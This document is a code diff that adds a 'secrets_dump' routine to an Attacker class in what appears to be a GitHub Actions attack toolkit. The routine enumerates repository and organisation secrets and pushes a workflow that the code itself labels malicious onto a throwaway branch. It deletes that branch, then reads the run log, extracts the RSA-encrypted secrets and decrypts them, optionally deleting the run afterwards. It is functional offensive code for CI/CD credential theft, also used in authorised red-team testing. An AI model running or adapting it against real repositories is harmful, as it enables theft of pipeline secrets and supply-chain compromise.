@@ -2,6 +2,13 @@ import logging
 import time
 import random
 import string
+import re
+import base64
+
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.asymmetric import padding
 
 from gato.github import Api
 from gato.git import Git
@@ -67,6 +74,23 @@ class Attacker:
             )
 
         return True
+
+    def __create_private_key(self):
+        """Creates a private and public key to safely exfil secrets.
+        """
+        # generate private key & write to disk  
+        private_key = rsa.generate_private_key(
+            public_exponent=65537,
+            key_size=4096,
+            backend=default_backend()
+        )
+        public_key = private_key.public_key()
+        pem = public_key.public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo
+        )
+
+        return (private_key, pem.decode())
 
     def fork_pr_attack(self, target_repo: str, target_branch: str,
                        pr_title: str, source_branch: str, payload: str,
@@ -358,6 +382,172 @@ class Attacker:
                     Output.error("Failed to delete workflow!")
                 else:
                     Output.result("Workflow deleted sucesfully!")
+        else:
+            Output.error(
+                "The user does not have the necessary scopes to conduct this "
+                "attack!")
+
+    def secrets_dump(
+            self,
+            target_repo: str,
+            target_branch: str,
+            commit_message: str,
+            delete_action: bool,
+            yaml_name: str):
+        """Dump accessible pipeline secrets from a repository. 
+
+        Args:
+            target_repo (str): Target repository to dump secrets from.
+        """
+        self.__setup_user_info()
+
+        if not self.user_perms:
+            return False
+
+        if 'repo' in self.user_perms['scopes'] and \
+           'workflow' in self.user_perms['scopes']:
+            secrets = []
+            repo_secret_list = self.api.get_secrets(target_repo)
+            org_secret_list = self.api.get_repo_org_secrets(target_repo)
+
+            if repo_secret_list:
+                secrets.extend(repo_secret_list)
+
+            if org_secret_list:
+                secrets.extend(org_secret_list)
+
+            if not secrets:
+                Output.warn(
+                    "The repository does not have any accessible secrets!"
+                )
+            else:
+                Output.owned(
+                    f"The repository has {Output.bright(len(secrets))} "
+                    "accessible secrets!"
+                )
+
+            secret_names = [secret['name'] for secret in secrets]
+
+            # Randomly generate a branch name, since this will run immediately
+            branch = ''.join(random.choices(
+                string.ascii_lowercase, k=10))
+
+            res = self.api.get_repo_branch(target_repo, branch)
+            if res == -1:
+                Output.error("Failed to check for remote branch!")
+                return
+            elif res == 1:
+                Output.error(f"Remote branch, {branch}, already exists!")
+                return
+
+            priv_key, pubkey_pem = self.__create_private_key()
+
+            yaml_contents = CICDAttack.create_exfil_yaml(
+                secret_names, pubkey_pem, branch
+            )
+
+            branch_created = self.api.create_branch(target_repo, branch)
+
+            if not branch_created:
+                Output.error("Failed to create branch!")
+                return False
+
+            rev_hash = self.api.commit_file(
+                target_repo,
+                branch,
+                f".github/workflows/{yaml_name}.yml",
+                yaml_contents.encode(),
+                message=commit_message
+            )
+
+            if not rev_hash:
+                Output.error("Failed to push the malicious workflow!")
+                return
+
+            Output.result("Succesfully pushed the malicious workflow!")
+
+            for i in range(self.timeout):
+                ret = self.api.delete_branch(target_repo, branch)
+                if ret:
+                    break
+                else:
+                    time.sleep(1)
+
+            if ret:
+                Output.result("Malicious branch deleted.")
+            else:
+                Output.error(f"Failed to delete the branch: {branch}.")
+
+            Output.tabbed("Waiting for the workflow to queue...")
+
+            for i in range(self.timeout):
+                workflow_id = self.api.get_recent_workflow(
+                    target_repo, rev_hash
+                )
+                if workflow_id == -1:
+                    Output.error("Failed to find the created workflow!")
+                    return
+                elif workflow_id > 0:
+                    break
+                else:
+                    time.sleep(1)
+            else:
+                Output.error("Failed to find the created workflow!")
+                return
+
+            Output.tabbed("Waiting for the workflow to execute...")
+
+            for i in range(self.timeout):
+                status = self.api.get_workflow_status(target_repo, workflow_id)
+                if status == -1:
+                    Output.error("The workflow failed!")
+                    break
+                elif status == 1:
+                    Output.result("The malicious workflow executed succesfully!")
+                    break
+                else:
+                    time.sleep(1)
+            else:
+                Output.error("The workflow is incomplete but hit the timeout!")
+
+            res = self.api.retrieve_workflow_log(
+                target_repo, workflow_id, "Run Tests"
+                )
+
+            if not res:
+                Output.error("Failed to download logs!")
+            else:
+                Output.info("Full job output:")
+                print(res)
+
+                # Parse out the base64 blob with a regex.
+                matcher = re.compile(r'(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)')
+
+                blob = matcher.findall(res)
+
+                if len(blob) == 2:
+                    encrypted_secrets = base64.b64decode(blob[1])
+                    Output.owned(
+                        "Decrypted and Decoded Secrets:\n"
+                    )
+
+                    plaintext = priv_key.decrypt(encrypted_secrets,
+                                                 padding.PKCS1v15()).decode()
+
+                    print(plaintext)
+                else:
+                    Output.error(
+                        "Unable to extract encoded output from runlog!"
+                    )
+
+            if delete_action:
+                res = self.api.delete_workflow_run(target_repo, workflow_id)
+                if not res:
+                    Output.error("Failed to delete workflow!")
+                else:
+                    Output.result("Workflow deleted sucesfully!")
+
+            pass
         else:
             Output.error(
                 "The user does not have the necessary scopes to conduct this "
